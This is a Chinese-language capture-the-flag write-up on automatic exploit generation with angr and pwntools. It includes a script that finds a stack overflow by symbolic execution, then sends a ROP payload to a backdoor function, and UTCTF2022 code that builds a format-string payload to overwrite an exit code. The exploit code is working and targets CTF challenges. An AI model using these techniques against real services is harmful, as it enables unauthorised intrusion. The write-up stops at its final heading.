
```python
from pwn import \*
import base64
import hashlib
import random
import angr
import claripy
def pass\_proof(salt, hash):
dir = string.ascii\_letters + string.digits
while True:
rand\_str = (''.join([random.choice(dir) for \_ in range(4)])).encode() + salt
if hashlib.sha256(rand\_str).hexdigest() == hash.decode() :
return rand\_str[:4]
p = remote('127.0.0.1', 9999)
p.recvuntil(b'sha256(xxxx + ')
salt = p.recvuntil(b')')[:-1]
p.recvuntil(b' == ')
hash = p.recvuntil(b'\n')[:-2]
t = pass\_proof(salt, hash)
p.sendlineafter(b"give me xxxx:", t)
p.recvline()
bin\_data = base64.b64decode(p.recvline().decode())
open("a", "wb").write(bin\_data)
def load\_str(state, addr):
s, i = '', 0
while True:
ch = state.solver.eval(state.memory.load(addr + i, 1))
if ch == 0:
break
s += chr(ch)
i += 1
return s
def save\_global\_val(state, bvs, type):
name = "s\_" + str(state.globals['count'])
state.globals['count'] += 1
state.globals[name] = (bvs, type)
class replace\_init(angr.SimProcedure):
def run(self):
return
class replace\_input\_line(angr.SimProcedure):
def run(self, buf\_addr, size):
size = self.state.solver.eval(size)
buf\_bvs = claripy.BVS("buf", size \* 8)
save\_global\_val(self.state, buf\_bvs, "str")
self.state.memory.store(buf\_addr, buf\_bvs)
class replace\_input\_val(angr.SimProcedure):
def run(self):
num\_bvs = claripy.BVS("num", 4 \* 8)
save\_global\_val(self.state, num\_bvs, "int")
self.state.regs.rax = num\_bvs
class replace\_fksth(angr.SimProcedure):
def run(self, str1\_addr, str2\_addr):
str2 = load\_str(self.state, str2\_addr).encode()
str1 = self.state.memory.load(str1\_addr, len(str2))
self.state.regs.rax = claripy.If(str1 == str2, claripy.BVV(0, 32), claripy.BVV(1, 32))
binary\_name = "a"
proj = angr.Project(binary\_name)
proj.hook\_symbol("\_Z4initv", replace\_init())
proj.hook\_symbol("\_Z10input\_linePcm", replace\_input\_line())
proj.hook\_symbol("\_Z9input\_valv", replace\_input\_val())
proj.hook\_symbol("\_Z5fksthPKcS0\_", replace\_fksth())
symbol = proj.loader.find\_symbol("main")
start\_addr = symbol.rebased\_addr
init\_state = proj.factory.blank\_state(addr = start\_addr)
init\_state.globals['count'] = 0
find\_addr = proj.loader.find\_symbol('\_Z10input\_linePcm').rebased\_addr
#判断在input\_line中是否发生溢出
def success(state):
if state.addr == find\_addr:
reg\_rbp = state.regs.rbp
reg\_rdi = state.regs.rdi
reg\_rsi = state.regs.rsi
add\_addr = reg\_rdi + reg\_rsi
copied\_state = state.copy()
copied\_state.add\_constraints(reg\_rbp < add\_addr)
if copied\_state.satisfiable():
state.add\_constraints(reg\_rbp < add\_addr)
state.globals['overflow'] = (state.solver.eval(reg\_rbp) - state.solver.eval(reg\_rdi), state.solver.eval(reg\_rsi)) #保存溢出大小和输入大小
return True
else:
return False
simgr = proj.factory.simgr(init\_state)
simgr.explore(find=success)
if simgr.found:
print("find")
bindata = b''
solution\_state = simgr.found[0]
for i in range(solution\_state.globals['count']):
s, s\_type = solution\_state.globals['s\_' + str(i)]
if s\_type == 'str':
bb = solution\_state.solver.eval(s, cast\_to=bytes)
bindata += bb
elif s\_type == 'int':
bindata += str(solution\_state.solver.eval(s, cast\_to=int)).encode() + b' '
elf = ELF(binary\_name, checksec=False)
context.arch = 'amd64'
ret = elf.search(asm('ret')).\_\_next\_\_()
m, n = solution\_state.globals['overflow']
payload = b'a' \* m + p64(0) + p64(ret) + p64(elf.sym['\_Z8backdoorv'])
bindata += payload.ljust(n, b'\x00')
p.send(bindata)
p.interactive()
else:
print('Could not find the solution')
```

# UTCTF2022 aeg

题目存在格式化字符串，而得到flag的方式是控制`exit`的参数为指定值。输入字符串后通过`permute`函数加密，再由`printf`去执行：

![](upload/attach/202309/958476_FMQ6MSF8GDYRYTB.webp)

根据前面做题的经验很快就可以写出如下通过约束的代码：

```python
import angr
import claripy
from pwn import\*
class replace\_fgets(angr.SimProcedure):
def run(self, addr, size, stdin):
buf\_bvs = claripy.BVS("buf", 513 \* 8)
self.state.memory.store(addr, buf\_bvs)
self.state.globals['buf'] = buf\_bvs
exit\_num = 92
binary\_name = "a"
elf = ELF("a", checksec=False)
context.arch = 'amd64'
proj = angr.Project(binary\_name)
proj.hook\_symbol("fgets", replace\_fgets())
start\_addr = elf.sym['main']
init\_state = proj.factory.blank\_state(addr = start\_addr)
simgr = proj.factory.simgr(init\_state)
exit\_code\_addr = elf.sym['exit\_code']
find\_addr = start\_addr + 0x8c
payload = fmtstr\_payload(8, {exit\_code\_addr:exit\_num}, write\_size='int')
simgr.explore(find=find\_addr)
if simgr.found:
solution\_state = simgr.found[0]
buf\_addr = solution\_state.regs.rsp + 0x10
buf = solution\_state.memory.load(buf\_addr, len(payload))
solution\_state.add\_constraints(buf == payload)
encodebuf = solution\_state.solver.eval(solution\_state.globals['buf'], cast\_to=bytes)
print(encodebuf)
else:
print('Could not find the solution')
```

但是这样直接去得到加密的字符串要花费将近两分钟，而这题限时60秒，这种方法是完全行不通的。

看完官方的wp才发现，`permute`中的这些加密函数并不是真正的加密，它们只是将初始字符的位置进行交换：

![](upload/attach/202309/958476_WSWJGQ4JHV974W2.webp)

这里简述一下官方wp的思路：
- 使用的`state.inspect.b`实际上是类似设置的断点，在发生读写内存时都会触发该断点，并进一步执行回调函数，具体可以参考：<mark class="encrypted">547K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2j5h3&6Y4M7W2)9J5k6h3W2G2i4K6u0r3k6h3&6Q4x3V1k6D9j5i4c8W2M7%4c8Q4x3V1k6U0L8%4u0W2i4K6u0V1j5$3!0F1j5$3g2H3N6s2y4Q4x3V1k6K6K9h3#2#2L8r3q4@1K9h3!0F1i4K6u0W2K9s2c8E0L8q4)9J5x3$3u0J5k6h3q4C8M7r3!0A6L8Y4c8K6</mark>
- 每次读写内存都会触发回调函数，在回调函数中`if write_addr < 0x1000`这个判断是为了得到字符的地址，而不是其它无关的地址。
- `permute1`、`permute2`、`permute3`……这些函数中都是将原始字符串分段，然后改变这些段的顺序读取到栈上，最后再去覆写原始字符串的数据，由于每次读写都会保存的每个字符的地址，也就知道了字符的顺序是怎样改变的。
- 最后的`for i in range(len(reads)//FLAG_LEN)`就是通过上述特性去逐步获取`permute1`、`permute2`、`permute3`……这些函数中字符改变的顺序，将最终的字符顺序保存到`transformations`中。

其实我们只用关心初始字符串的顺序和最终字符串的顺序，字符串在`permute1`、`permute2`、`permute3`……这些函数中的变化是完全不用考虑的，最后改写代码如下：

```python
import angr
import claripy
from pwn import\*
def aeg(binary\_name, exit\_num):
elf = ELF(binary\_name, checksec=False)
context.arch = 'amd64'
proj = angr.Project(binary\_name)
start\_addr = elf.sym['permute']
buf\_addr = 0x800000
#一定要配置这个add\_options可选项，以便在符号执行中使用unicorn，不然也会巨慢无比
init\_state = proj.factory.call\_state(
start\_addr,
buf\_addr,
add\_options=angr.options.unicorn.union({angr.options.SYMBOL\_FILL\_UNCONSTRAINED\_MEMORY})
)
#这个初始化地址中的值其实是有一定问题的，因为单字节最大值只能是255，最后的顺序列表中会存在两个相同的值
#最后转换顺序时高地址的0x100个字符无法赋值，由于格式化的是低地址的字符，高地址的0x100个字符可以不用考虑
for i in range(512):
init\_state.memory.store(buf\_addr + i, i, 1)
encode\_num = []
init\_state.regs.rdi = buf\_addr
simgr = proj.factory.simgr(init\_state)
find\_addr = start\_addr + 0x71
simgr.explore(find = find\_addr)
state = simgr.found[0]
for i in range(512):
encode\_num.append(state.solver.eval(state.memory.load(buf\_addr + i, 1)))
print(encode\_num)
aeg("a", 100)
```

这个直接几秒钟就可以得到最终的字符顺序表。

完整exp：
